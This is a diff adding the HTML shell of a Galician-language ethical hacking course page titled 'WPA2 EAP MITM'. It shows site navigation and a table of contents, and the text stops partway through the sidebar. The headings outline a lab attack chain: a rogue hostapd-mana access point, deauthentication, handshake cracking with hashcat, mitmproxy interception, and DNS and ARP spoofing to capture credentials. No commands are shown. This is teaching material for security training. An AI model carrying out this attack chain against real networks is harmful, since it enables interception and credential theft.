@@ -1,0 +1,1778 @@
+
+<!DOCTYPE html>
+
+<html class="no-js" lang="gl">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<link href="../2-ATAQUE_WPA2_EAP_EVIL_TWIN/" rel="prev"/>
+<link href="../wifite-2.1-ATAQUE_WPA2_EAP/" rel="next"/>
+<link href="../../../../assets/images/favicon.png" rel="icon"/>
+<meta content="mkdocs-1.6.1, mkdocs-material-9.6.22" name="generator"/>
+<title>WPA2 EAP MITM - Hacking Ético - UD4 - O hacking ético nas redes sen fíos</title>
+<link href="../../../../assets/stylesheets/main.84d31ad4.min.css" rel="stylesheet"/>
+<link href="../../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
+<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+<link href="../../../../css/custom.css" rel="stylesheet"/>
+<link href="../../../../css/opera.css" rel="stylesheet"/>
+<link href="../../../../css/print.css" rel="stylesheet"/>
+<script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+</head>
+<body data-md-color-accent="indigo" data-md-color-primary="indigo" data-md-color-scheme="default" dir="ltr">
+<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
+<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
+<label class="md-overlay" for="__drawer"></label>
+<div data-md-component="skip">
+<a class="md-skip" href="#guia-de-practica-23-mitm-wi-fi-wpa2-eap-con-hostapd-mana">
+          Ir ao contido
+        </a>
+</div>
+<div data-md-component="announce">
+</div>
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+<nav aria-label="Cabeceira" class="md-header__inner md-grid">
+<a aria-label="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" class="md-header__button md-logo" data-md-component="logo" href="../../../.." title="Hacking Ético - UD4 - O hacking ético nas redes sen fíos">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+<label class="md-header__button md-icon" for="__drawer">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
+</label>
+<div class="md-header__title" data-md-component="header-title">
+<div class="md-header__ellipsis">
+<div class="md-header__topic">
+<span class="md-ellipsis">
+            Hacking Ético - UD4 - O hacking ético nas redes sen fíos
+          </span>
+</div>
+<div class="md-header__topic" data-md-component="header-topic">
+<span class="md-ellipsis">
+            
+              WPA2 EAP MITM
+            
+          </span>
+</div>
+</div>
+</div>
+<form class="md-header__option" data-md-component="palette">
+<input aria-label="Cambiar a modo oscuro" class="md-option" data-md-color-accent="indigo" data-md-color-media="" data-md-color-primary="indigo" data-md-color-scheme="default" id="__palette_0" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Cambiar a modo oscuro">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg>
+</label>
+<input aria-label="Cambiar a modo normal" class="md-option" data-md-color-accent="indigo" data-md-color-media="" data-md-color-primary="black" data-md-color-scheme="slate" id="__palette_1" name="__palette" type="radio"/>
+<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Cambiar a modo normal">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg>
+</label>
+</form>
+<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+<label class="md-header__button md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+</label>
+<div class="md-search" data-md-component="search" role="dialog">
+<label class="md-search__overlay" for="__search"></label>
+<div class="md-search__inner" role="search">
+<form class="md-search__form" name="search">
+<input aria-label="Procura" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Procura" required="" spellcheck="false" type="text"/>
+<label class="md-search__icon md-icon" for="__search">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
+</label>
+<nav aria-label="Procurar" class="md-search__options">
+<button aria-label="Limpar" class="md-search__icon md-icon" tabindex="-1" title="Limpar" type="reset">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
+</button>
+</nav>
+</form>
+<div class="md-search__output">
+<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
+<div class="md-search-result" data-md-component="search-result">
+<div class="md-search-result__meta">
+            Inicializando procura
+          </div>
+<ol class="md-search-result__list" role="presentation"></ol>
+</div>
+</div>
+</div>
+</div>
+</div>
+</nav>
+<nav aria-label="Pestanas" class="md-tabs" data-md-component="tabs">
+<div class="md-grid">
+<ul class="md-tabs__list">
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../../..">
+        
+  
+  
+    
+  
+  De interese
+
+      </a>
+</li>
+<li class="md-tabs__item">
+<a class="md-tabs__link" href="../../../apuntamentos/modo-22000/">
+          
+  
+  
+  Apuntamentos
+
+        </a>
+</li>
+<li class="md-tabs__item md-tabs__item--active">
+<a class="md-tabs__link" href="../../wifi-psk/">
+          
+  
+  
+  Prácticas Taller UD4
+
+        </a>
+</li>
+</ul>
+</div>
+</nav>
+</header>
+<div class="md-container" data-md-component="container">
+<main class="md-main" data-md-component="main">
+<div class="md-main__inner md-grid">
+<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav aria-label="Navegación" class="md-nav md-nav--primary md-nav--lifted" data-md-level="0">
+<label class="md-nav__title" for="__drawer">
+<a aria-label="Hacking Ético - UD4 - O hacking ético nas redes sen fíos" class="md-nav__button md-logo" data-md-component="logo" href="../../../.." title="Hacking Ético - UD4 - O hacking ético nas redes sen fíos">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
+</a>
+    Hacking Ético - UD4 - O hacking ético nas redes sen fíos
+  </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../..">
+<span class="md-ellipsis">
+    De interese
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Apuntamentos
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_2">
+<span class="md-nav__icon md-icon"></span>
+            Apuntamentos
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../apuntamentos/modo-22000/">
+<span class="md-ellipsis">
+    Formato WPA*02 (hashcat modo 22000)
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../apuntamentos/modo-5500/">
+<span class="md-ellipsis">
+    Formato NetNTLMv1 (hashcat modo 5500)
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_2_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+<span class="md-ellipsis">
+    Laboratorio vuln-wifi.lab
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_2_3_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_2_3">
+<span class="md-nav__icon md-icon"></span>
+            Laboratorio vuln-wifi.lab
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../../apuntamentos/GUIA_VISUAL_ATAQUES_WIFI_all/">
+<span class="md-ellipsis">
+    Guía Visual de Ataques WiFi
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+<span class="md-ellipsis">
+    Prácticas Taller UD4
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
+<label class="md-nav__title" for="__nav_3">
+<span class="md-nav__icon md-icon"></span>
+            Prácticas Taller UD4
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--nested">
+<input class="md-nav__toggle md-toggle" id="__nav_3_1" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+<span class="md-ellipsis">
+    Wi-Fi
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="false" aria-labelledby="__nav_3_1_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_3_1">
+<span class="md-nav__icon md-icon"></span>
+            Wi-Fi
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../wifi-psk/">
+<span class="md-ellipsis">
+    WPA2 (PSK)
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../wifi-eap/">
+<span class="md-ellipsis">
+    WPA2 (EAP)
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../../wifi-sae/">
+<span class="md-ellipsis">
+    WPA3 (SAE)
+    
+  </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Vuln Lab Wi-Fi
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_3_2_label" class="md-nav" data-md-level="2">
+<label class="md-nav__title" for="__nav_3_2">
+<span class="md-nav__icon md-icon"></span>
+            Vuln Lab Wi-Fi
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_2_1" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3_2_1" id="__nav_3_2_1_label" tabindex="0">
+<span class="md-ellipsis">
+    Laboratorio
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_3_2_1_label" class="md-nav" data-md-level="3">
+<label class="md-nav__title" for="__nav_3_2_1">
+<span class="md-nav__icon md-icon"></span>
+            Laboratorio
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../">
+<span class="md-ellipsis">
+    README
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active md-nav__item--nested">
+<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_2_1_2" type="checkbox"/>
+<label class="md-nav__link" for="__nav_3_2_1_2" id="__nav_3_2_1_2_label" tabindex="0">
+<span class="md-ellipsis">
+    Ataques específicos
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<nav aria-expanded="true" aria-labelledby="__nav_3_2_1_2_label" class="md-nav" data-md-level="4">
+<label class="md-nav__title" for="__nav_3_2_1_2">
+<span class="md-nav__icon md-icon"></span>
+            Ataques específicos
+          </label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="../1-ATAQUE_WPA2_PSK/">
+<span class="md-ellipsis">
+    WPA2 PSK
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-1-ATAQUE_WPA2_PSK/">
+<span class="md-ellipsis">
+    — wifite WPA2 PSK
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../1.2-ATAQUE_WPA2_PSK_PMF/">
+<span class="md-ellipsis">
+    WPA2 PSK PMF
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-1.2-ATAQUE_WPA2_PSK_PMF/">
+<span class="md-ellipsis">
+    — wifite WPA2 PSK PMF
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../1.3-ATAQUE_WPA2_PSK_PMKID/">
+<span class="md-ellipsis">
+    WPA2 PSK PMKID
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-1.3-ATAQUE_WPA2_PSK_PMKID/">
+<span class="md-ellipsis">
+    — wifite WPA2 PSK PMKID
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../2-ATAQUE_WPA2_EAP_EVIL_TWIN/">
+<span class="md-ellipsis">
+    WPA2 EAP EVIL TWIN
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item md-nav__item--active">
+<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
+<label class="md-nav__link md-nav__link--active" for="__toc">
+<span class="md-ellipsis">
+    WPA2 EAP MITM
+    
+  </span>
+<span class="md-nav__icon md-icon"></span>
+</label>
+<a class="md-nav__link md-nav__link--active" href="./">
+<span class="md-ellipsis">
+    WPA2 EAP MITM
+    
+  </span>
+</a>
+<nav aria-label="Táboa de contidos" class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">
+<span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#1-contexto-e-topoloxia">
+<span class="md-ellipsis">
+      1. Contexto e Topoloxía
+    </span>
+</a>
+<nav aria-label="1. Contexto e Topoloxía" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#11-rol-de-interfaces-wi-fi">
+<span class="md-ellipsis">
+      1.1. Rol de Interfaces Wi-Fi
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#12-topoloxia-de-rede">
+<span class="md-ellipsis">
+      1.2. Topoloxía de Rede
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#2-preparacion-da-infraestrutura-consola-1-rede-corporativa">
+<span class="md-ellipsis">
+      2. Preparación da Infraestrutura (Consola 1 → Rede Corporativa)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#3-configuracion-do-mitm-ap-consola-3-mitm">
+<span class="md-ellipsis">
+      3. Configuración do MITM AP (Consola 3 → MITM)
+    </span>
+</a>
+<nav aria-label="3. Configuración do MITM AP (Consola 3 → MITM)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#31-entrar-no-namespace-mitm">
+<span class="md-ellipsis">
+      3.1. Entrar no Namespace MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#32-preparar-wlan2">
+<span class="md-ellipsis">
+      3.2. Preparar wlan2
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#33-crear-configuracion-de-hostapd-mana-pax-14-do-pdf">
+<span class="md-ellipsis">
+      3.3. Crear Configuración de hostapd-mana (Páx. 14 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#34-executar-hostapd-mana-pax-15">
+<span class="md-ellipsis">
+      3.4. Executar hostapd-mana (Páx. 15)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#35-configurar-rede-e-dhcp-nova-terminal-consola-3b">
+<span class="md-ellipsis">
+      3.5. Configurar Rede e DHCP (Nova Terminal → Consola 3b)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#4-desautenticacion-e-forzado-consola-4-monitor">
+<span class="md-ellipsis">
+      4. Desautenticación e Forzado (Consola 4 → Monitor)
+    </span>
+</a>
+<nav aria-label="4. Desautenticación e Forzado (Consola 4 → Monitor)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#41-configurar-monitor-pax-16-do-pdf">
+<span class="md-ellipsis">
+      4.1. Configurar Monitor (Páx. 16 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#42-escanear-ambos-aps">
+<span class="md-ellipsis">
+      4.2. Escanear Ambos APs
+    </span>
+</a>
+<nav aria-label="4.2. Escanear Ambos APs" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#421-escanear-soamente-o-ap-lexitimo">
+<span class="md-ellipsis">
+      4.2.1 Escanear soamente o AP lexítimo
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#43-configurar-canal-e-desautenticar-pax-16-17">
+<span class="md-ellipsis">
+      4.3. Configurar Canal e Desautenticar (Páx. 16-17)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#5-verificacion-de-conexion-ao-mitm-consola-2">
+<span class="md-ellipsis">
+      5. Verificación de Conexión ao MITM (Consola 2)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#6-captura-de-handshakes-wpa2-consola-3">
+<span class="md-ellipsis">
+      6. Captura de Handshakes WPA2 (Consola 3)
+    </span>
+</a>
+<nav aria-label="6. Captura de Handshakes WPA2 (Consola 3)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#61-visualizar-logs-pax-18-do-pdf">
+<span class="md-ellipsis">
+      6.1. Visualizar Logs (Páx. 18 do PDF)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#7-tentativa-de-crackear-handshake-wpa2-consola-5-analise">
+<span class="md-ellipsis">
+      7. Tentativa de Crackear Handshake WPA2 (Consola 5 → Análise)
+    </span>
+</a>
+<nav aria-label="7. Tentativa de Crackear Handshake WPA2 (Consola 5 → Análise)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#71-extraer-hash-wpa2-pax-18-19-do-pdf">
+<span class="md-ellipsis">
+      7.1. Extraer Hash WPA2 (Páx. 18-19 do PDF)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#72-tentar-crackear-con-hashcat-modo-22000">
+<span class="md-ellipsis">
+      7.2. Tentar Crackear con hashcat (Modo 22000)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#73-conclusion-critica-pax-19-do-pdf">
+<span class="md-ellipsis">
+      7.3. Conclusión Crítica (Páx. 19 do PDF)
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#8-interceptacion-de-trafico-con-mitmproxy-consola-6-namespace-mitm_wlan2">
+<span class="md-ellipsis">
+      8. Interceptación de Tráfico con mitmproxy (Consola 6 → namespace mitm_wlan2)
+    </span>
+</a>
+<nav aria-label="8. Interceptación de Tráfico con mitmproxy (Consola 6 → namespace mitm_wlan2)" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#81-entrar-no-namespace-mitm">
+<span class="md-ellipsis">
+      8.1. Entrar no Namespace MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#82-instalar-mitmproxy-se-non-esta">
+<span class="md-ellipsis">
+      8.2. Instalar mitmproxy (se non está)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#83-configurar-nat">
+<span class="md-ellipsis">
+      8.3. Configurar NAT
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#84-configurar-dns">
+<span class="md-ellipsis">
+      8.4. Configurar DNS
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#85-verificar-conectividade">
+<span class="md-ellipsis">
+      8.5. Verificar Conectividade
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#86-redirixir-portos-http-e-https-a-mitmproxy">
+<span class="md-ellipsis">
+      8.6. Redirixir Portos HTTP e HTTPS a mitmproxy
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#87-executar-mitmproxy">
+<span class="md-ellipsis">
+      8.7. Executar mitmproxy
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#9-punto-de-decision-continuar-ao-ataque-mitm-consolas-3-4-e-6">
+<span class="md-ellipsis">
+      9. PUNTO DE DECISIÓN: Continuar ao ataque MITM (Consolas 3, 4 e 6)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#91-despois-de-desautenticacion-renovar-ip-do-mitm">
+<span class="md-ellipsis">
+      9.1. DESPOIS de Desautenticación: Renovar IP do MITM
+    </span>
+</a>
+<nav aria-label="9.1. DESPOIS de Desautenticación: Renovar IP do MITM" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#911-verificar-migracion-ao-mitm">
+<span class="md-ellipsis">
+      9.1.1. Verificar Migración ao MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#912-renovar-ip-para-a-rede-do-mitm">
+<span class="md-ellipsis">
+      9.1.2. Renovar IP para a Rede do MITM
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#92-verificar-conectividade-co-mitm">
+<span class="md-ellipsis">
+      9.2 Verificar Conectividade co MITM
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#93-xerar-trafico-http-agora-si-interceptado">
+<span class="md-ellipsis">
+      9.3 Xerar Tráfico HTTP (AGORA SI Interceptado)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#10-conclusion-e-tecnicas-de-ataque-post-autenticacion">
+<span class="md-ellipsis">
+      10. Conclusión e Técnicas de Ataque Post-Autenticación
+    </span>
+</a>
+<nav aria-label="10. Conclusión e Técnicas de Ataque Post-Autenticación" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#101-vantaxes-do-mitm-proxy-vs-evil-twin">
+<span class="md-ellipsis">
+      10.1. Vantaxes do MITM Proxy vs Evil Twin
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#102-limitacions-tecnicas">
+<span class="md-ellipsis">
+      10.2. Limitacións Técnicas
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#103-tecnicas-de-captura-de-credenciais">
+<span class="md-ellipsis">
+      10.3. Técnicas de Captura de Credenciais
+    </span>
+</a>
+<nav aria-label="10.3. Técnicas de Captura de Credenciais" class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a class="md-nav__link" href="#a-interceptacion-http-con-mitmproxy-consola-6">
+<span class="md-ellipsis">
+      A) Interceptación HTTP con mitmproxy (Consola 6)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#b-dns-spoofing-consola-3b-namespace-mitm_wlan2">
+<span class="md-ellipsis">
+      B) DNS Spoofing (Consola 3b - namespace mitm_wlan2)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#c-arp-spoofing">
+<span class="md-ellipsis">
+      C) ARP Spoofing
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#104-limitacions-de-hsts-http-strict-transport-security">
+<span class="md-ellipsis">
+      10.4. Limitacións de HSTS (HTTP Strict Transport Security)
+    </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#105-obxectivo-acadado">
+<span class="md-ellipsis">
+      10.5. Obxectivo Acadado
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="#11-limpeza">
+<span class="md-ellipsis">
+      11. Limpeza
+    </span>
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-2.1-ATAQUE_WPA2_EAP/">
+<span class="md-ellipsis">
+    — wifite WPA2 EAP  — NON SOPORTADO
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../3.1-ATAQUE_WPA3_SAE/">
+<span class="md-ellipsis">
+    WPA3 SAE
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-3.1-ATAQUE_WPA3-SAE/">
+<span class="md-ellipsis">
+    — wifite WPA3 SAE  — NON SOPORTADO
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../3.2-ATAQUE_WPA3_KRACK/">
+<span class="md-ellipsis">
+    WPA3 SAE KRACK
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../wifite-3.2-ATAQUE_WPA3_KRACK/">
+<span class="md-ellipsis">
+    — wifite WPA3 SAE KRACK  — NON SOPORTADO
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
+<a class="md-nav__link" href="../3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN/">
+<span class="md-ellipsis">
+    WPA3 SAE downgrade WPA2 PSK EVIL TWIN
+    
+  </span>
+</a>
+</li>
+<li class="md-nav__item">
